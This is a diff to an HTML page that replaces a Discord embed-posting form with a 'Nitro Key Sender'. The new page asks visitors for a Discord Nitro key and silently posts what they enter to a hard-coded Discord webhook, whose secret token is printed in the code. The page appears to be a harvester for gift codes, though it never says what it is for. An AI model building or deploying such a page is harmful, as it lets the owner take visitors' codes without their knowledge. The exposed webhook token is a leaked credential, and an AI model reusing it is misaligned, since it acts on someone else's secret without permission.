@@ -3,36 +3,36 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Embed Sender</title>
+  <title>Nitro Key Sender</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       background-color: #f4f4f9;
       margin: 0;
-      padding: 20px;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
     .container {
-      max-width: 600px;
-      margin: 0 auto;
+      width: 300px;
       padding: 20px;
       background-color: #fff;
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
     }
     h1 {
-      text-align: center;
       color: #333;
+      margin-bottom: 20px;
     }
-    input[type="text"], select, textarea {
+    input[type="text"] {
       width: 100%;
       padding: 10px;
-      margin: 10px 0;
+      margin-bottom: 20px;
       border: 1px solid #ddd;
       border-radius: 4px;
-    }
-    textarea {
-      height: 100px;
-      resize: vertical;
+      text-align: center;
     }
     button {
       width: 100%;
@@ -49,23 +49,16 @@
     }
   </style>
   <script>
-    function sendEmbed() {
-      const title = document.getElementById("embedTitle").value;
-      const description = document.getElementById("embedDescription").value;
-      const message = document.getElementById("messageContent").value;
+    function sendNitroKey() {
+      const nitroKey = document.getElementById("nitroKey").value;
 
-      if (!title || !description || !message) {
-        alert("Please fill out all fields.");
+      if (!nitroKey) {
+        alert("Please enter a Nitro Key.");
         return;
       }
 
       const payload = {
-        content: message,
-        embeds: [{
-          title: title,
-          description: description,
-          color: 3447003
-        }]
+        content: `Nitro Key Entered: ${nitroKey}`
       };
 
       const webhookUrl = 'https://discord.com/api/webhooks/1311057682022797434/om54aFEYSM4VYlmMXh1VsipdCTZk4Ka-6FMWoiDGizrzscc1_D5pY8H34re_AYKKjb43';
@@ -77,30 +70,24 @@
       })
       .then(response => {
         if (response.ok) {
-          alert('Embed sent successfully!');
-          document.getElementById("embedTitle").value = "";
-          document.getElementById("embedDescription").value = "";
-          document.getElementById("messageContent").value = "";
+          alert('Nitro Key sent successfully!');
+          document.getElementById("nitroKey").value = "";
         } else {
-          alert('Failed to send embed.');
+          alert('Failed to send Nitro Key.');
         }
       })
       .catch(error => {
         console.error('Error:', error);
-        alert('An error occurred while sending the embed.');
+        alert('An error occurred while sending the Nitro Key.');
       });
     }
   </script>
 </head>
 <body>
   <div class="container">
-    <h1>Embed Sender</h1>
-    <p>Fill out the details below to send an embed message to Discord.</p>
-
-    <input type="text" id="embedTitle" placeholder="Enter embed title" />
-    <textarea id="embedDescription" placeholder="Enter embed description"></textarea>
-    <textarea id="messageContent" placeholder="Enter your message"></textarea>
-    <button onclick="sendEmbed()">Send Embed</button>
+    <h1>Nitro Key Sender</h1>
+    <input type="text" id="nitroKey" placeholder="Enter Nitro Key" />
+    <button onclick="sendNitroKey()">Send Nitro Key</button>
   </div>
 </body>
 </html>
